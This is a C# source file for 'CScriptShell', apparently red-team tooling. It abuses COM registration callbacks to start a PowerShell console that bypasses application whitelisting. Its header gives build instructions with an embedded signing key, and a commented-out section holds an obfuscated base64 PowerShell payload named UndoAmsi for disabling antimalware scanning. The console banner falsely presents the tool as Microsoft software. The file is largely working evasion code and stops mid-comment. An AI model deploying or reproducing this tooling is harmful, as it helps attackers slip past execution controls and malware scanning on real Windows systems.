using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Globalization;
using System.Reflection;
using System.Security;
using Microsoft.Win32;
using System.ComponentModel;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using PowerShell = System.Management.Automation.PowerShell;


/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Create Your Strong Name Key -> key.snk
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /r:System.EnterpriseServices.dll,System.Management.Automation.dll /target:library /out:CScriptShell.dll /keyfile:key.snk CScriptShell.cs
*/

[ assembly: ApplicationName("Bypasser")]
//[ assembly: ApplicationID("4fb2d46f-efc8-4643-bcd0-6e5bfa6a174c")] 
namespace Delivery
{
	[GuidAttribute("4fb2d46f-efc8-4643-bcd0-6e5bfa6a174c")]
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
		
		[DllImport("ntdll.dll")]
		private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);

		[StructLayout(LayoutKind.Sequential)]
		internal struct RTL_OSVERSIONINFOEX
		{
			internal uint dwOSVersionInfoSize;
			internal uint dwMajorVersion;
			internal uint dwMinorVersion;
			internal uint dwBuildNumber;
			internal uint dwPlatformId;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			internal string szCSDVersion;
		}

		public static decimal RtlGetVersion()
		{
			RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
			osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
			//const string version = "Microsoft Windows";
			if (RtlGetVersion(out osvi) == 0)
			{
				string Version = osvi.dwMajorVersion + "." + osvi.dwMinorVersion;
				return decimal.Parse(Version, CultureInfo.InvariantCulture);
			}
			else
			{
				return -1;
			}
		}
	
		public static void PrintBanner()
		{
			Console.BackgroundColor = ConsoleColor.DarkBlue;
			Console.ForegroundColor = ConsoleColor.White;
			Console.Clear();
			Console.WriteLine("Windows CScriptShell");
			Console.WriteLine("Copyright(C) 2017 Microsoft Corporation, subTee and Cn33liz. All rights reserved.");
			Console.WriteLine();
		}

		private static PowerListenerConsole PowerListener = new PowerListenerConsole();

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            Console.WriteLine("Hey From Register!");
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
			Console.Title = "Windows CScriptShell";
			PrintBanner();
			string LatestOSVersion = "6.3";
			decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
			/*
			if (RtlGetVersion() > latestOSVersionDec)
			{
				string UndoAmsi = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"IElOdm9rRS1leHByZVNTSU9uICggKCBbcnVOVGlNRS5JbnRFUk9QU2VSVklDRXMubUFSU0hBbF06OlB0UnRPc3RSSW5HQXV0byggW3JVTnRJTWUuaU5URVJvUFNlclZJY2VTLm1BcnNoQUxdOjpTZWN1ckVTVHJJbmd0b0JTdFIoJCgnNzY0OTJkMTExNjc0M2YwNDIzNDEzYjE2MDUwYTUzNDVNZ0I4QUhFQVRRQmxBREFBTkFCV0FEUUFTQUJJQURZQWVBQmlBSGtBYkFCTkFHUUFjUUJIQUhFQWNnQkZBRkVBUFFBOUFId0FaZ0ExQUdNQVlnQXpBRElBWXdCaUFHUUFZUUF6QURZQVl3QmhBRElBTUFBM0FEa0FOUUJtQURVQVpnQTNBR1FBT1FBM0FEZ0FZUUF6QUdZQU5BQTJBRFVBTmdBeUFEa0FNUUE0QURrQVl3QXdBRElBWWdBd0FEa0FaQUJsQURZQU1BQXpBRFFBTlFCa0FESUFaZ0F4QUdRQVpnQmhBRE1BTVFBM0FEQUFaQUJpQURNQU5BQTVBREFBTndCakFEVUFPUUE1QUdNQU5nQmlBR1FBWXdBMUFHVUFZd0JsQURVQU5nQXdBRGtBWXdBd0FEWUFPQUF5QURFQU9RQmhBRElBWWdBMkFETUFPUUEyQURjQVlnQTBBRE1BT1FBeEFHUUFNd0EzQUdRQU5BQmtBRElBTkFBMEFHVUFNZ0F3QUdNQVpnQXdBRFFBWkFBekFHRUFaQUEzQURnQVl3QTVBRGdBT0FCakFESUFOQUJqQUdVQU5BQTBBRFVBWlFBNUFHRUFNUUJoQURVQU9RQTRBREFBWmdBd0FHWUFOZ0E1QURRQU1RQTFBR0VBTmdBNUFETUFaQUJpQURBQVlRQm1BRE1BWmdBeEFHUUFOd0E0QUdJQU1nQTRBRE1BT1FCbEFHVUFPQUEyQURRQVpBQTVBR0VBTVFCaUFESUFaQUJoQUdFQU5nQTVBRGdBTVFCbEFEY0FaUUEyQURJQVpBQmlBRElBWXdCbEFESUFaQUJpQUdNQVpBQmlBREFBWXdCaEFEQUFaQUE1QURZQVlRQTFBREVBTmdCa0FETUFOd0ExQURjQVpBQXdBRFlBTXdBd0FHVUFOUUEwQURFQU1BQTRBREVBTUFBNUFESUFNUUExQURnQU5BQmhBRFVBWXdBekFHTUFOQUF4QUdVQVpnQXlBRFVBWWdCbEFEa0FaZ0F6QURrQU9BQTVBREFBWlFBNUFESUFZUUEyQURVQU9RQXpBREVBT1FBMkFEVUFaUUF4QURjQU1BQTNBRFVBTlFCaEFHRUFNZ0EwQUdJQU5nQTFBRGNBTlFBeEFEUUFOd0F5QURZQU53QXhBRGtBTkFBMEFEWUFNZ0EwQURrQU5nQmxBR1lBWVFCakFHWUFOUUJsQURRQVpBQmhBRGdBTmdBM0FERUFaZ0JoQUdVQU9BQmxBRFVBTUFBMkFEY0FOQUE1QURNQVpBQTBBRGdBWlFBd0FHUUFNQUF5QURjQU5BQTJBR0VBTndBekFEVUFZUUE1QUdRQU1nQmtBR1FBTXdBMEFHRUFOZ0EwQUdRQU9RQTJBRGtBTndBd0FHRUFZd0ExQURnQU5nQXhBREFBTUFBMkFEUUFNUUJqQURFQVpRQmtBREFBTVFBMkFEZ0FaZ0F5QURNQU13QXpBRE1BWXdBNUFHWUFNUUJtQURJQU53QXdBRFVBWmdBMkFEVUFNd0F5QURnQU13QTBBRGNBWWdBNEFEVUFZZ0JtQURNQU1BQTFBRFFBTkFCbEFHWUFaQUF6QUdNQU53Qm1BRFVBTmdBM0FHUUFPUUF6QURFQU1nQTFBRFVBWlFBekFEY0FaZ0JqQUdFQU53QTRBR0lBWWdBNEFESUFPUUJoQUdVQU9RQXhBRGdBTmdBMEFEY0FNQUF6QUdJQVpRQmlBRFVBWkFBd0FEVUFPUUF4QURFQU53QTRBRGtBTlFBd0FESUFOd0JpQURnQVpRQTVBR1lBTVFBekFEQUFNUUF5QURFQU5RQXhBRGNBTWdCaUFETUFPQUF6QURjQU53QmxBR01BWkFCbEFHWUFZZ0JtQURVQU13QmxBR1lBWXdBeUFEa0FOd0EzQUdNQU5RQmxBRElBWXdBeUFERUFOQUF4QUdFQU5nQmpBR1FBTWdBNUFESUFNd0F4QURZQVpRQm1BREFBTXdBekFEVUFZd0JrQUdZQU5BQT0nIHxjb25WRVJUdG8tc0VjdVJFc3RSSU5HICAta0VZICgyMTIuLjE4MSkpICkpKSkg"));
				PowerListener.Execute(UndoAmsi);
			}
			*/

			PowerListener.CommandShell();
		}
	}
	class PowerListenerConsole
	{
		private bool shouldExit;

		private int exitCode;

		private MyHost myHost;

		internal Runspace myRunSpace;

		private PowerShell currentPowerShell;

		private object instanceLock = new object();

		public PowerListenerConsole()
		{

			InitialSessionState state = InitialSessionState.CreateDefault();
			state.AuthorizationManager = new System.Management.Automation.AuthorizationManager("Dummy");

			this.myHost = new MyHost(this);
			this.myRunSpace = RunspaceFactory.CreateRunspace(this.myHost, state);
			this.myRunSpace.Open();

			lock (this.instanceLock)
			{
				this.currentPowerShell = PowerShell.Create();
			}

			try
			{
				this.currentPowerShell.Runspace = this.myRunSpace;

				PSCommand[] profileCommands = HostUtilities.GetProfileCommands("PowerShell");
				foreach (PSCommand command in profileCommands)
				{
					this.currentPowerShell.Commands = command;
					this.currentPowerShell.Invoke();
				}
			}
			finally
			{
				lock (this.instanceLock)
				{
					this.currentPowerShell.Dispose();
					this.currentPowerShell = null;
				}
			}
		}

		public bool ShouldExit
		{
			get { return this.shouldExit; }
			set { this.shouldExit = value; }
		}

		public int ExitCode
		{
			get { return this.exitCode; }
			set { this.exitCode = value; }
		}

		public void CommandShell()
		{
			PowerListenerConsole listener = new PowerListenerConsole();
			listener.CommandPrompt();
		}

		private void executeHelper(string cmd, object input)
		{
			if (String.IsNullOrEmpty(cmd))
			{
				return;
			}

			lock (this.instanceLock)
			{
				this.currentPowerShell = PowerShell.Create();
			}

			try
			{
				this.currentPowerShell.Runspace = this.myRunSpace;
				this.currentPowerShell.AddScript(cmd);
				this.currentPowerShell.AddCommand("out-default");
				this.currentPowerShell.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);

				if (input != null)
				{
					this.currentPowerShell.Invoke(new object[] { input });
				}
				else
				{
					this.currentPowerShell.Invoke();
				}
			}
			finally
			{
				lock (this.instanceLock)
				{
					this.currentPowerShell.Dispose();
					this.currentPowerShell = null;
				}
			}
		}

		private void ReportException(Exception e)
		{
			if (e != null)
			{
				object error;
				IContainsErrorRecord icer = e as IContainsErrorRecord;
				if (icer != null)
				{
					error = icer.ErrorRecord;
				}
				else
				{
					error = (object)new ErrorRecord(e, "Host.ReportException", ErrorCategory.NotSpecified, null);
				}

				lock (this.instanceLock)
				{
					this.currentPowerShell = PowerShell.Create();
				}

				this.currentPowerShell.Runspace = this.myRunSpace;

				try
				{
					this.currentPowerShell.AddScript("$input").AddCommand("out-string");

					Collection<PSObject> result;
					PSDataCollection<object> inputCollection = new PSDataCollection<object>();
					inputCollection.Add(error);
					inputCollection.Complete();
					result = this.currentPowerShell.Invoke(inputCollection);

					if (result.Count > 0)
					{
						string str = result[0].BaseObject as string;
						if (!string.IsNullOrEmpty(str))
						{
							this.myHost.UI.WriteErrorLine(str.Substring(0, str.Length - 2));
						}
					}
				}
				finally
				{
					lock (this.instanceLock)
					{
						this.currentPowerShell.Dispose();
						this.currentPowerShell = null;
					}
				}
			}
		}

		public void Execute(string cmd)
		{
			try
			{
				this.executeHelper(cmd, null);
			}
			catch (RuntimeException rte)
			{
				this.ReportException(rte);
			}
		}

		private void HandleControlC(object sender, ConsoleCancelEventArgs e)
		{
			try
			{
				lock (this.instanceLock)
				{
					if (this.currentPowerShell != null && this.currentPowerShell.InvocationStateInfo.State == PSInvocationState.Running)
					{
						this.currentPowerShell.Stop();
					}
				}

				e.Cancel = true;
			}
			catch (Exception exception)
			{
				this.myHost.UI.WriteErrorLine(exception.ToString());
			}
		}

		private void CommandPrompt()
		{
			int bufSize = 8192;
			Stream inStream = Console.OpenStandardInput(bufSize);
			Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));

			Console.CancelKeyPress += new ConsoleCancelEventHandler(this.HandleControlC);
			Console.TreatControlCAsInput = false;

			while (!this.ShouldExit)
			{
				string prompt;
				if (this.myHost.IsRunspacePushed)
				{
					prompt = string.Format("[{0}]: PS> ", this.myRunSpace.ConnectionInfo.ComputerName);
				}
				else
				{
					prompt = string.Format("PS {0}> ", this.myRunSpace.SessionStateProxy.Path.CurrentFileSystemLocation.Path);
				}

				this.myHost.UI.Write(prompt);
				string cmd = Console.ReadLine();
				if (cmd == "exit" || cmd == "quit")
				{
					return;
				}
				else if (cmd == "cls")
				{
					Console.Clear();
				}
				else
				{
					try
					{
						this.Execute(cmd);
					}
					catch (Exception e)
					{
						Console.WriteLine(e.Message);
					}
				}
			}

		}
	}

	internal class MyHost : PSHost, IHostSupportsInteractiveSession
	{
		/// <summary>
		/// A reference to the runspace used to start an interactive session.
		/// </summary>
		public Runspace pushedRunspace = null;

		/// <summary>
		/// Initializes a new instance of the MyHost class. Keep a reference 
		/// to the host application object so that it can be informed when 
		/// to exit.
		/// </summary>
		/// <param name="program">A reference to the host application object.</param>
		public MyHost(PowerListenerConsole program)
		{
			this.program = program;
		}

		/// <summary>
		/// The identifier of this instance of the host implementation.
		/// </summary>
		private static Guid instanceId = Guid.NewGuid();

		/// <summary>
		/// A reference to the PSHost implementation.
		/// </summary>
		private PowerListenerConsole program;

		/// <summary>
		/// The culture information of the thread that created this object.
		/// </summary>
		private CultureInfo originalCultureInfo = System.Threading.Thread.CurrentThread.CurrentCulture;

		/// <summary>
		/// The UI culture information of the thread that created this object.
		/// </summary>
		private CultureInfo originalUICultureInfo = System.Threading.Thread.CurrentThread.CurrentUICulture;

		/// <summary>
		/// A reference to the implementation of the PSHostUserInterface
		/// class for this application.
		/// </summary>
		private MyHostUserInterface myHostUserInterface = new MyHostUserInterface();

		/// <summary>
		/// Gets the culture information to use. This implementation takes a 
		/// snapshot of the culture information of the thread that created 
		/// this object.
		/// </summary>
		public override CultureInfo CurrentCulture
		{
			get { return this.originalCultureInfo; }
		}

		/// <summary>
		/// Gets the UI culture information to use. This implementation takes 
		/// snapshot of the UI culture information of the thread that created 
		/// this object.
		/// </summary>
		public override CultureInfo CurrentUICulture
		{
			get { return this.originalUICultureInfo; }
		}

		/// <summary>
		/// Gets the identifier of this instance of the host implementation. 
		/// This implementation always returns the GUID allocated at 
		/// instantiation time.
		/// </summary>
		public override Guid InstanceId
		{
			get { return instanceId; }
		}

		/// <summary>
		/// Gets the name of the host implementation. This string may be used 
		/// by script writers to identify when this host is being used.
		/// </summary>
		public override string Name
		{
			get { return "CScriptShell"; }
		}

		/// <summary>
		/// Gets an instance of the implementation of the PSHostUserInterface class 
		/// for this application. This instance is allocated once at startup time
		/// and returned every time thereafter.
		/// </summary>
		public override PSHostUserInterface UI
		{
			get { return this.myHostUserInterface; }
		}

		/// <summary>
		/// Gets the version object for this host application. Typically 
		/// this should match the version resource in the application.
		/// </summary>
		public override Version Version
		{
			get { return new Version(1, 0, 0, 0); }
		}

		#region IHostSupportsInteractiveSession Properties

		/// <summary>
		/// Gets a value indicating whether a request 
		/// to open a PSSession has been made.
		/// </summary>
		public bool IsRunspacePushed
		{
			get { return this.pushedRunspace != null; }
		}

		/// <summary>
		/// Gets or sets the runspace used by the PSSession.
		/// </summary>
		public Runspace Runspace
		{
			get { return this.program.myRunSpace; }
			internal set { this.program.myRunSpace = value; }
		}
		#endregion IHostSupportsInteractiveSession Properties

		/// <summary>
		/// Instructs the host to interrupt the currently running pipeline 
		/// and start a new nested input loop. Not implemented by this example class. 
		/// The call fails with an exception.
		/// </summary>
		public override void EnterNestedPrompt()
		{
			throw new NotImplementedException("Cannot suspend the shell, EnterNestedPrompt() method is not implemented by MyHost.");
		}

		/// <summary>
		/// Instructs the host to exit the currently running input loop. Not 
		/// implemented by this example class. The call fails with an 
		/// exception.
		/// </summary>
		public override void ExitNestedPrompt()
		{
			throw new NotImplementedException("The ExitNestedPrompt() method is not implemented by MyHost.");
		}

		/// <summary>
		/// Notifies the host that the Windows PowerShell runtime is about to 
		/// execute a legacy command-line application. Typically it is used 
		/// to restore state that was changed by a child process after the 
		/// child exits. This implementation does nothing and simply returns.
		/// </summary>
		public override void NotifyBeginApplication()
		{
			return;  // Do nothing.
		}

		/// <summary>
		/// Notifies the host that the Windows PowerShell engine has 
		/// completed the execution of a legacy command. Typically it 
		/// is used to restore state that was changed by a child process 
		/// after the child exits. This implementation does nothing and 
		/// simply returns.
		/// </summary>
		public override void NotifyEndApplication()
		{
			return; // Do nothing.
		}

		/// <summary>
		/// Indicate to the host application that exit has
		/// been requested. Pass the exit code that the host
		/// application should use when exiting the process.
		/// </summary>
		/// <param name="exitCode">The exit code that the host application should use.</param>
		public override void SetShouldExit(int exitCode)
		{
			this.program.ShouldExit = true;
			this.program.ExitCode = exitCode;
		}

		#region IHostSupportsInteractiveSession Methods

		/// <summary>
		/// Requests to close a PSSession.
		/// </summary>
		public void PopRunspace()
		{
			Runspace = this.pushedRunspace;
			this.pushedRunspace = null;
		}

		/// <summary>
		/// Requests to open a PSSession.
		/// </summary>
		/// <param name="runspace">Runspace to use.</param>
		public void PushRunspace(Runspace runspace)
		{
			this.pushedRunspace = Runspace;
			Runspace = runspace;
		}

		#endregion IHostSupportsInteractiveSession Methods
	}


	internal class MyHostUserInterface : PSHostUserInterface, IHostUISupportsMultipleChoiceSelection
	{
		[DllImport("ole32.dll")]
		public static extern void CoTaskMemFree(IntPtr ptr);

		[DllImport("credui.dll", CharSet = CharSet.Auto)]
		private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);

		[DllImport("credui.dll", CharSet = CharSet.Auto)]
		private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		private struct CREDUI_INFO
		{
			public int cbSize;
			public IntPtr hwndParent;
			public string pszMessageText;
			public string pszCaptionText;
			public IntPtr hbmBanner;
		}
		/// <summary>
		/// A reference to the MyRawUserInterface implementation.
		/// </summary>
		private MyRawUserInterface myRawUi = new MyRawUserInterface();

		/// <summary>
		/// Gets an instance of the PSRawUserInterface object for this host
		/// application.
		/// </summary>
		public override PSHostRawUserInterface RawUI
		{
			get { return this.myRawUi; }
		}

		/// <summary>
		/// Prompts the user for input.
		/// </summary>
		/// <param name="caption">Text that preceeds the prompt (a title).</param>
		/// <param name="message">Text of the prompt.</param>
		/// <param name="descriptions">A collection of FieldDescription objects 
		/// that contains the user input.</param>
		/// <returns>A dictionary object that contains the results of the user prompts.</returns>
		public override Dictionary<string, PSObject> Prompt(
					   string caption,
					   string message,
					   Collection<FieldDescription> descriptions)
		{
			this.Write(
				  ConsoleColor.Blue,
				  ConsoleColor.Black,
				  caption + "\n" + message + " ");
			Dictionary<string, PSObject> results =
				new Dictionary<string, PSObject>();
			foreach (FieldDescription fd in descriptions)
			{
				string[] label = GetHotkeyAndLabel(fd.Label);
				this.WriteLine(label[1]);
				string userData = Console.ReadLine();
				if (userData == null)
				{
					return null;
				}

				results[fd.Name] = PSObject.AsPSObject(userData);
			}

			return results;
		}

		/// <summary>
		/// Provides a set of choices that enable the user to choose a single option 
		/// from a set of options. 
		/// </summary>
		/// <param name="caption">A title that proceeds the choices.</param>
		/// <param name="message">An introduction  message that describes the 
		/// choices.</param>
		/// <param name="choices">A collection of ChoiceDescription objects that describ 
		/// each choice.</param>
		/// <param name="defaultChoice">The index of the label in the Choices parameter 
		/// collection that indicates the default choice used if the user does not specify 
		/// a choice. To indicate no default choice, set to -1.</param>
		/// <returns>The index of the Choices parameter collection element that corresponds 
		/// to the option that is selected by the user.</returns>
		public override int PromptForChoice(
											string caption,
											string message,
											Collection<ChoiceDescription> choices,
											int defaultChoice)
		{
			// Write the caption and message strings in Blue.
			this.WriteLine(
						   ConsoleColor.Blue,
						   ConsoleColor.Black,
						   caption + "\n" + message + "\n");

			// Convert the choice collection into something that's a
			// little easier to work with
			// See the BuildHotkeysAndPlainLabels method for details.
			string[,] promptData = BuildHotkeysAndPlainLabels(choices);

			// Format the overall choice prompt string to display...
			StringBuilder sb = new StringBuilder();
			for (int element = 0; element < choices.Count; element++)
			{
				sb.Append(String.Format(
										CultureInfo.CurrentCulture,
										"|{0}> {1} ",
										promptData[0, element],
										promptData[1, element]));
			}

			sb.Append(String.Format(
									CultureInfo.CurrentCulture,
									"[Default is ({0}]",
									promptData[0, defaultChoice]));

			// loop reading prompts until a match is made, the default is
			// chosen or the loop is interrupted with ctrl-C.
			while (true)
			{
				this.WriteLine(ConsoleColor.Cyan, ConsoleColor.Black, sb.ToString());
				string data = Console.ReadLine().Trim().ToUpper(CultureInfo.CurrentCulture);

				// if the choice string was empty, use the default selection
				if (data.Length == 0)
				{
					return defaultChoice;
				}

				// see if the selection matched and return the
				// corresponding index if it did...
				for (int i = 0; i < choices.Count; i++)
				{
					if (promptData[0, i] == data)
					{
						return i;
					}
				}

				this.WriteErrorLine("Invalid choice: " + data);
			}
		}

		#region IHostUISupportsMultipleChoiceSelection Members

		/// <summary>
		/// Provides a set of choices that enable the user to choose a one or more options 
		/// from a set of options. 
		/// </summary>
		/// <param name="caption">A title that proceeds the choices.</param>
		/// <param name="message">An introduction  message that describes the 
		/// choices.</param>
		/// <param name="choices">A collection of ChoiceDescription objects that describe each choice.</param>
		/// <param name="defaultChoices">The index of the label in the Choices parameter 
		/// collection that indicates the default choice used if the user does not specify 
		/// a choice. To indicate no default choice, set to -1.</param>
		/// <returns>The index of the Choices parameter collection element that corresponds 
		/// to the choices selected by the user.</returns>
		public Collection<int> PromptForChoice(
											   string caption,
											   string message,
											   Collection<ChoiceDescription> choices,
											   IEnumerable<int> defaultChoices)
		{
			// Write the caption and message strings in Blue.
			this.WriteLine(
						   ConsoleColor.Blue,
						   ConsoleColor.Black,
						   caption + "\n" + message + "\n");

			// Convert the choice collection into something that's a
			// little easier to work with
			// See the BuildHotkeysAndPlainLabels method for details.
			string[,] promptData = BuildHotkeysAndPlainLabels(choices);

			// Format the overall choice prompt string to display...
			StringBuilder sb = new StringBuilder();
			for (int element = 0; element < choices.Count; element++)
			{
				sb.Append(String.Format(
										CultureInfo.CurrentCulture,
										"|{0}> {1} ",
										promptData[0, element],
										promptData[1, element]));
			}

			Collection<int> defaultResults = new Collection<int>();
			if (defaultChoices != null)
			{
				int countDefaults = 0;
				foreach (int defaultChoice in defaultChoices)
				{
					++countDefaults;
					defaultResults.Add(defaultChoice);
				}

				if (countDefaults != 0)
				{
					sb.Append(countDefaults == 1 ? "[Default choice is " : "[Default choices are ");
					foreach (int defaultChoice in defaultChoices)
					{
						sb.AppendFormat(
										CultureInfo.CurrentCulture,
										"\"{0}\",",
										promptData[0, defaultChoice]);
					}

					sb.Remove(sb.Length - 1, 1);
					sb.Append("]");
				}
			}

			this.WriteLine(ConsoleColor.Cyan, ConsoleColor.Black, sb.ToString());

			// loop reading prompts until a match is made, the default is
			// chosen or the loop is interrupted with ctrl-C.
			Collection<int> results = new Collection<int>();
			while (true)
			{
				ReadNext:
				string prompt = string.Format(CultureInfo.CurrentCulture, "Choice[{0}]:", results.Count);
				this.Write(ConsoleColor.Cyan, ConsoleColor.Black, prompt);
				string data = Console.ReadLine().Trim().ToUpper(CultureInfo.CurrentCulture);

				// if the choice string was empty, no more choices have been made.
				// if there were no choices made, return the defaults
				if (data.Length == 0)
				{
					return (results.Count == 0) ? defaultResults : results;
				}

				// see if the selection matched and return the
				// corresponding index if it did...
				for (int i = 0; i < choices.Count; i++)
				{
					if (promptData[0, i] == data)
					{
						results.Add(i);
						goto ReadNext;
					}
				}

				this.WriteErrorLine("Invalid choice: " + data);
			}
		}

		#endregion

		/// <summary>
		/// Prompts the user for credentials with a specified prompt window 
		/// caption, prompt message, user name, and target name.
		/// </summary>
		/// <param name="caption">The caption of the message window.</param>
		/// <param name="message">The text of the message.</param>
		/// <param name="userName">The user name whose credential is to be prompted for.</param>
		/// <param name="targetName">The name of the target for which the credential is collected.</param>
		/// <returns>Throws a NotImplementException exception.</returns>
		public override PSCredential PromptForCredential(
									 string caption,
									 string message,
									 string userName,
									 string targetName)
		{
			PromptCredentialsResult result = CredentialUI.PromptForCredentials(targetName, caption, message, userName, null);
			return result == null ? null : new PSCredential(result.UserName, result.Password.ToSecureString());
		}


		/// <summary>
		/// Prompts the user for credentials by using a specified prompt window 
		/// caption, prompt message, user name and target name, credential types 
		/// allowed to be returned, and UI behavior options.
		/// </summary>
		/// <param name="caption">The caption of the message window.</param>
		/// <param name="message">The text of the message.</param>
		/// <param name="userName">The user name whose credential is to be prompted for.</param>
		/// <param name="targetName">The name of the target for which the credential is collected.</param>
		/// <param name="allowedCredentialTypes">PSCredentialTypes cconstants that identify the type of 
		/// credentials that can be returned.</param>
		/// <param name="options">A PSCredentialUIOptions constant that identifies the UI behavior 
		/// when it gathers the credentials.</param>
		/// <returns>Throws a NotImplementException exception.</returns>
		public override PSCredential PromptForCredential(
							   string caption,
							   string message,
							   string userName,
							   string targetName,
							   PSCredentialTypes allowedCredentialTypes,
							   PSCredentialUIOptions options)
		{
			PromptCredentialsResult result = CredentialUI.PromptForCredentials(targetName, caption, message, userName, null);
			return result == null ? null : new PSCredential(result.UserName, result.Password.ToSecureString());
		}


		/// <summary>
		/// Reads characters that are entered by the user until a 
		/// newline (carriage return) is encountered.
		/// </summary>
		/// <returns>The characters entered by the user.</returns>
		public override string ReadLine()
		{
			return Console.ReadLine();
		}

		/// <summary>
		/// Reads characters entered by the user until a newline (carriage return) 
		/// is encountered and returns the characters as a secure string.
		/// </summary>
		/// <returns>A secure string of the characters entered by the user.</returns>
		public override System.Security.SecureString ReadLineAsSecureString()
		{
			return Console.ReadLine().ToSecureString();
		}

		/// <summary>
		/// Writes a line of characters to the output display of the host 
		/// and appends a newline (carriage return).
		/// </summary>
		/// <param name="value">The characters to be written.</param>
		public override void Write(string value)
		{
			Console.Write(value);
		}

		/// <summary>
		/// Writes characters to the output display of the host with possible 
		/// foreground and background colors. 
		/// </summary>
		/// <param name="foregroundColor">The color of the characters.</param>
		/// <param name="backgroundColor">The backgound color to use.</param>
		/// <param name="value">The characters to be written.</param>
		public override void Write(
								   ConsoleColor foregroundColor,
								   ConsoleColor backgroundColor,
								   string value)
		{
			ConsoleColor oldFg = Console.ForegroundColor;
			ConsoleColor oldBg = Console.BackgroundColor;
			Console.ForegroundColor = foregroundColor;
			Console.BackgroundColor = backgroundColor;
			Console.Write(value);
			Console.ForegroundColor = oldFg;
			Console.BackgroundColor = oldBg;
		}

		/// <summary>
		/// Writes a line of characters to the output display of the host 
		/// with foreground and background colors and appends a newline (carriage return). 
		/// </summary>
		/// <param name="foregroundColor">The forground color of the display. </param>
		/// <param name="backgroundColor">The background color of the display. </param>
		/// <param name="value">The line to be written.</param>
		public override void WriteLine(
									   ConsoleColor foregroundColor,
									   ConsoleColor backgroundColor,
									   string value)
		{
			ConsoleColor oldFg = Console.ForegroundColor;
			ConsoleColor oldBg = Console.BackgroundColor;
			Console.ForegroundColor = foregroundColor;
			Console.BackgroundColor = backgroundColor;
			Console.WriteLine(value);
			Console.ForegroundColor = oldFg;
			Console.BackgroundColor = oldBg;
		}

		/// <summary>
		/// Writes a debug message to the output display of the host.
		/// </summary>
		/// <param name="message">The debug message that is displayed.</param>
		public override void WriteDebugLine(string message)
		{
			this.WriteLine(
						   ConsoleColor.DarkYellow,
						   ConsoleColor.Black,
						   String.Format(CultureInfo.CurrentCulture, "DEBUG: {0}", message));
		}

		/// <summary>
		/// Writes an error message to the output display of the host.
		/// </summary>
		/// <param name="value">The error message that is displayed.</param>
		public override void WriteErrorLine(string value)
		{
			this.WriteLine(ConsoleColor.Red, ConsoleColor.Black, value);
		}

		/// <summary>
		/// Writes a newline character (carriage return) 
		/// to the output display of the host. 
		/// </summary>
		public override void WriteLine()
		{
			Console.WriteLine();
		}

		/// <summary>
		/// Writes a line of characters to the output display of the host 
		/// and appends a newline character(carriage return). 
		/// </summary>
		/// <param name="value">The line to be written.</param>
		public override void WriteLine(string value)
		{
			Console.WriteLine(value);
		}

		/// <summary>
		/// Writes a verbose message to the output display of the host.
		/// </summary>
		/// <param name="message">The verbose message that is displayed.</param>
		public override void WriteVerboseLine(string message)
		{
			this.WriteLine(
						   ConsoleColor.Yellow,
						   ConsoleColor.Black,
						   String.Format(CultureInfo.CurrentCulture, "VERBOSE: {0}", message));
		}

		/// <summary>
		/// Writes a warning message to the output display of the host.
		/// </summary>
		/// <param name="message">The warning message that is displayed.</param>
		public override void WriteWarningLine(string message)
		{
			this.WriteLine(
						   ConsoleColor.Yellow,
						   ConsoleColor.Black,
						   String.Format(CultureInfo.CurrentCulture, "WARNING: {0}", message));
		}

		/// <summary>
		/// Writes a progress report to the output display of the host. 
